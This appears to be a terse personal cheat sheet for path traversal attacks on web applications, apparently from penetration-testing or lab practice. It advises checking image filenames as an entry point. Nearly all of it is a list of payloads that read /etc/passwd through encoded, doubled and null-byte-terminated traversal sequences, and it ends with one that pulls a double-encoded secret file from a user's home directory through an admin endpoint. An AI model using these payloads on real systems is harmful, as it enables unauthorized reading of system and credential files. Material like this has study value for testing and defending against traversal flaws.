Check images filenames also as a potential exploiting point
(**USE BURP REPEATER** fucking god)
```
../../../../../etc/passwd

/etc/passwd

....//....//....//....//....//etc/passwd

..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd

..%252f..%252f..%252f..%252f..%252fetc/passwd      (URL-Encode del '%')

%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd

valid-file/../../../../../../etc/passwd

/var/www/images/../../../../../../etc/passwd

../../../../../../../etc/passwd%00.jpg            (NULL BYTE) --> %00
../../../../../../../etc/passwd%00.png
../../../../../../../etc/passwd%00


adminpanel/admin_img?file_name=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/home
/carlos/%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34 (secret encoded twice)

```

------------------------------------------------------------------------
